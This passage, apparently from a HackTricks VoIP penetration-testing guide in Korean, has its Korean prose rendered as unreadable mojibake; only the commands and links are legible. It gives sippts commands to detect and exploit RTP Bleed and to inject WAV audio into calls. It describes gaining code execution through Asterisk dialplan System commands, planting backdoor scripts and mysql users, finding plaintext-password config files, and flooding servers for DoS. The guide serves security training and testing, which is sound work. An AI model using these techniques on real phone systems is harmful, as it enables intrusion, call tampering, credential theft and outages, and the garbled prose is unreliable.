RTP í”„ë¡ì‹œì™€ RTP ìŠ¤íƒì˜ ë˜ ë‹¤ë¥¸ í¥ë¯¸ë¡œìš´ ë™ì‘ì€ ë•Œë•Œë¡œ **RTP Bleedì— ì·¨ì•½í•˜ì§€ ì•Šë”ë¼ë„** **ëª¨ë“  ì¶œì²˜ì˜ RTP íŒ¨í‚·ì„ ìˆ˜ë½í•˜ê³  ì „ë‹¬ ë°/ë˜ëŠ” ì²˜ë¦¬**í•œë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤. ë”°ë¼ì„œ ê³µê²©ìëŠ” í•©ë²•ì ì¸ ë¯¸ë””ì–´ ëŒ€ì‹  ìì‹ ì˜ ë¯¸ë””ì–´ë¥¼ ì£¼ì…í•  ìˆ˜ ìˆëŠ” RTP íŒ¨í‚·ì„ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìš°ë¦¬ëŠ” ì´ ê³µê²©ì„ RTP ì£¼ì…ì´ë¼ê³  ë¶€ë¥´ë©°, ì´ëŠ” ê¸°ì¡´ RTP ìŠ¤íŠ¸ë¦¼ì— ë¶ˆë²•ì ì¸ RTP íŒ¨í‚·ì„ ì£¼ì…í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤. ì´ ì·¨ì•½ì ì€ RTP í”„ë¡ì‹œì™€ ì—”ë“œí¬ì¸íŠ¸ ëª¨ë‘ì—ì„œ ë°œê²¬ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

Asteriskì™€ FreePBXëŠ” ì „í†µì ìœ¼ë¡œ **`NAT=yes` ì„¤ì •**ì„ ì‚¬ìš©í•˜ì—¬ RTP íŠ¸ë˜í”½ì´ ì¸ì¦ì„ ìš°íšŒí•˜ë„ë¡ í•˜ì—¬, í†µí™”ì—ì„œ ì˜¤ë””ì˜¤ê°€ ì—†ê±°ë‚˜ ì¼ë°©í–¥ ì˜¤ë””ì˜¤ê°€ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ìì„¸í•œ ì •ë³´ëŠ” [https://www.rtpbleed.com/](https://www.rtpbleed.com/)ë¥¼ í™•ì¸í•˜ì„¸ìš”.

* **`SIPPTS rtpbleed`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedëŠ” RTP ìŠ¤íŠ¸ë¦¼ì„ ì „ì†¡í•˜ì—¬ RTP Bleed ì·¨ì•½ì ì„ ê°ì§€í•©ë‹ˆë‹¤.
```bash
sippts rtpbleed -i 10.10.0.10
```
* **`SIPPTS rtcpbleed`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtcpbleedëŠ” RTCP ìŠ¤íŠ¸ë¦¼ì„ ì „ì†¡í•˜ì—¬ RTP Bleed ì·¨ì•½ì ì„ ê°ì§€í•©ë‹ˆë‹¤.
```bash
sippts rtcpbleed -i 10.10.0.10
```
* **`SIPPTS rtpbleedflood`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedfloodëŠ” RTP ìŠ¤íŠ¸ë¦¼ì„ ì „ì†¡í•˜ì—¬ RTP Bleed ì·¨ì•½ì ì„ ì•…ìš©í•©ë‹ˆë‹¤.
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
* **`SIPPTS rtpbleedinject`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedinjectëŠ” ì˜¤ë””ì˜¤ íŒŒì¼(WAV í˜•ì‹)ì„ ì£¼ì…í•˜ì—¬ RTP Bleed ì·¨ì•½ì ì„ ì•…ìš©í•©ë‹ˆë‹¤.
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

Asteriskì—ì„œ ì–´ë–»ê²Œë“  **í™•ì¥ ê·œì¹™ì„ ì¶”ê°€í•˜ê³  ì´ë¥¼ ë‹¤ì‹œ ë¡œë“œ**í•  ìˆ˜ ìˆë‹¤ë©´(ì˜ˆ: ì·¨ì•½í•œ ì›¹ ê´€ë¦¬ì ì„œë²„ë¥¼ íƒ€ê²Ÿìœ¼ë¡œ í•˜ì—¬), **`System`** ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ RCEë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
There is command called **`Shell`** that could be used **instead of `System`** to execute system commands if necessary.

{% hint style="warning" %}
ì„œë²„ê°€ **`System`** ëª…ë ¹ì—ì„œ **íŠ¹ì • ë¬¸ìì˜ ì‚¬ìš©ì„ ê¸ˆì§€**í•˜ê³  ìˆëŠ” ê²½ìš°(ì˜ˆ: Elastix), ì›¹ ì„œë²„ê°€ **ì‹œìŠ¤í…œ ë‚´ì—ì„œ íŒŒì¼ì„ ìƒì„±í•  ìˆ˜ ìˆëŠ”ì§€** í™•ì¸í•˜ê³ (ì˜ˆ: Elastix ë˜ëŠ” trixbox), ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ **ë°±ë„ì–´ ìŠ¤í¬ë¦½íŠ¸**ë¥¼ ìƒì„±í•œ ë‹¤ìŒ **`System`**ì„ ì‚¬ìš©í•˜ì—¬ í•´ë‹¹ **ìŠ¤í¬ë¦½íŠ¸**ë¥¼ **ì‹¤í–‰**í•˜ì‹­ì‹œì˜¤.
{% endhint %}

#### í¥ë¯¸ë¡œìš´ ë¡œì»¬ íŒŒì¼ ë° ê¶Œí•œ

* **`sip.conf`** -> SIP ì‚¬ìš©ì ë¹„ë°€ë²ˆí˜¸ë¥¼ í¬í•¨í•©ë‹ˆë‹¤.
* **Asterisk ì„œë²„ê°€ rootë¡œ ì‹¤í–‰ë˜ê³  ìˆëŠ” ê²½ìš°**, rootë¥¼ ì†ìƒì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **mysql root ì‚¬ìš©ì**ëŠ” **ë¹„ë°€ë²ˆí˜¸ê°€ ì—†ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.
* ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ ë°±ë„ì–´ë¡œ ìƒˆë¡œìš´ mysql ì‚¬ìš©ìë¥¼ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **`FreePBX`**
* **`amportal.conf`** -> ì›¹ íŒ¨ë„ ê´€ë¦¬ì(FreePBX)ì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ í¬í•¨í•©ë‹ˆë‹¤.
* **`FreePBX.conf`** -> ë°ì´í„°ë² ì´ìŠ¤ì— ì ‘ê·¼í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” FreePBXuserì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ í¬í•¨í•©ë‹ˆë‹¤.
* ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ ë°±ë„ì–´ë¡œ ìƒˆë¡œìš´ mysql ì‚¬ìš©ìë¥¼ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **`Elastix`**
* **`Elastix.conf`** -> mysql root ë¹„ë°€ë²ˆí˜¸, IMAPd ë¹„ë°€ë²ˆí˜¸, ì›¹ ê´€ë¦¬ì ë¹„ë°€ë²ˆí˜¸ì™€ ê°™ì€ ì—¬ëŸ¬ ë¹„ë°€ë²ˆí˜¸ë¥¼ í‰ë¬¸ìœ¼ë¡œ í¬í•¨í•©ë‹ˆë‹¤.
* **ì—¬ëŸ¬ í´ë”**ëŠ” ì†ìƒëœ asterisk ì‚¬ìš©ìì—ê²Œ ì†í•©ë‹ˆë‹¤(ë£¨íŠ¸ë¡œ ì‹¤í–‰ë˜ì§€ ì•ŠëŠ” ê²½ìš°). ì´ ì‚¬ìš©ìëŠ” ì´ì „ íŒŒì¼ì„ ì½ì„ ìˆ˜ ìˆìœ¼ë©° êµ¬ì„±ë„ ì œì–´í•˜ë¯€ë¡œ Asteriskê°€ ì‹¤í–‰ë  ë•Œ ë‹¤ë¥¸ ë°±ë„ì–´ê°€ ìˆëŠ” ë°”ì´ë„ˆë¦¬ë¥¼ ë¡œë“œí•˜ë„ë¡ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### RTP ì£¼ì…

**`rtpinsertsound`** (`sudo apt install rtpinsertsound`) ë° **`rtpmixsound`** (`sudo apt install rtpmixsound`)ì™€ ê°™ì€ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ëŒ€í™”ì— **`.wav`** íŒŒì¼ì„ ì‚½ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë˜ëŠ” [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/)ì˜ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬ **ëŒ€í™”ë¥¼ ìŠ¤ìº”**í•˜ê³ (**`rtpscan.pl`**), ëŒ€í™”ì— **`.wav`** íŒŒì¼ì„ ì „ì†¡í•˜ë©°(**`rtpsend.pl`**), ëŒ€í™”ì— **ë…¸ì´ì¦ˆë¥¼ ì‚½ì…**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(**`rtpflood.pl`**).

### DoS

VoIP ì„œë²„ì—ì„œ DoSë¥¼ ë‹¬ì„±í•˜ê¸° ìœ„í•œ ì—¬ëŸ¬ ë°©ë²•ì´ ìˆìŠµë‹ˆë‹¤.

* **`SIPPTS flood`** from [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS í”ŒëŸ¬ë“œëŠ” ëŒ€ìƒì—ê²Œ ë¬´ì œí•œ ë©”ì‹œì§€ë¥¼ ì „ì†¡í•©ë‹ˆë‹¤.
* `sippts flood -i 10.10.0.10 -m invite -v`
* **`SIPPTS ping`** from [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS í•‘ì€ ì„œë²„ ì‘ë‹µ ì‹œê°„ì„ í™•ì¸í•˜ê¸° ìœ„í•´ SIP í•‘ì„ ë³´ëƒ…ë‹ˆë‹¤.
* `sippts ping -i 10.10.0.10`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): Asteriskì—ì„œ ì‚¬ìš©í•˜ëŠ” DoS IAX í”„ë¡œí† ì½œ
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): UDP/IPë¥¼ í†µí•´ SIP/SDP INVITE ë©”ì‹œì§€ í”ŒëŸ¬ë”©ì„ ìˆ˜í–‰í•˜ëŠ” ë„êµ¬ì…ë‹ˆë‹¤.
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): ì—¬ëŸ¬ ê°œì˜ ì˜ í˜•ì„±ëœ RTP íŒ¨í‚·ì„ ì „ì†¡í•©ë‹ˆë‹¤. ì‚¬ìš© ì¤‘ì¸ RTP í¬íŠ¸ë¥¼ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤(ë¨¼ì € ìŠ¤ë‹ˆí•‘).
* [**SIPp**](https://github.com/SIPp/sipp): SIP íŠ¸ë˜í”½ì„ ë¶„ì„í•˜ê³  ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ DoSì—ë„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): SIP ìŠ¤ìœ„ìŠ¤ êµ°ìš© ì¹¼. SIP ê³µê²©ì„ ìˆ˜í–‰í•˜ëŠ” ë°ì—ë„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* í¼ì €: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).

### OS ì·¨ì•½ì 

Asteriskì™€ ê°™ì€ ì†Œí”„íŠ¸ì›¨ì–´ë¥¼ ì„¤ì¹˜í•˜ëŠ” ê°€ì¥ ì‰¬ìš´ ë°©ë²•ì€ ì´ë¯¸ ì„¤ì¹˜ëœ **OS ë°°í¬íŒ**ì„ ë‹¤ìš´ë¡œë“œí•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ì˜ˆ: **FreePBX, Elastix, Trixbox**... ë¬¸ì œëŠ” ì‘ë™í•˜ê¸° ì‹œì‘í•˜ë©´ ì‹œìŠ¤í…œ ê´€ë¦¬ìê°€ **ë‹¤ì‹œ ì—…ë°ì´íŠ¸í•˜ì§€ ì•Šì„ ìˆ˜** ìˆìœ¼ë©° **ì·¨ì•½ì **ì´ ì‹œê°„ì´ ì§€ë‚¨ì— ë”°ë¼ ë°œê²¬ë  ê²ƒì´ë¼ëŠ” ì ì…ë‹ˆë‹¤.

## References

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
